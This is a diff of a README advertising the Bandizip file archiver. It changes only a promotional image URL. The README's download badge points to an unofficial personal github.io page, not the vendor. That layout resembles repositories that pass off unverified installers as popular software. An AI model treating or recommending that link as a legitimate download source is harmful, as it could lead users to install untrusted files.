@@ -17,7 +17,7 @@ Students, developers, IT professionals, businesses, content creators, and everyd
 
 Bandizip supports high-speed compression, encrypted archives, password protection, drag-and-drop operations, archive preview, integrity testing, Unicode filenames, multi-core processing, and seamless integration with Windows File Explorer. Whether compressing large projects, extracting downloaded archives, or organizing backups, Bandizip provides a fast and dependable archive management experience.
 
-<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQHHEu-Av0uJRmYqZAQ_Ev5H3sI-zx1J5wp0xEVfZ5M4A&s" width="900">
+<img src="https://store-images.s-microsoft.com/image/apps.50233.14549842876675971.b856eeaa-eff4-43ab-8a09-e7c08b17c6cd.bf596573-dcf4-4a69-80a0-380ea99870c9" width="900">
 
 [![Hi](https://img.shields.io/badge/Get%20for-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://cmetankadd.github.io/.github//Bandizip-File-Archiver)
 
